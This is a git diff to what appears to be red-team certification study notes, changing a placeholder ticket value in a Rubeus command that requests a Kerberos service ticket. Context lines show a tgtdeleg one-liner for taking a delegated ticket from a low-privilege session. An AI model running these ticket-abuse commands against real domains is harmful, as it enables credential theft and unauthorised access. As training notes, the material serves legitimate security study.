@@ -473,7 +473,7 @@ Request ticket (TGT) based on username and password/hash:
 - [from previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
 
 Request Service ticket (TGS) based on Service Name:
-```rubeus.exe asktgs /user:admin /ticket:doIDF== /service:LDAP/dc1.ecorp.lab```
+```rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab```
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
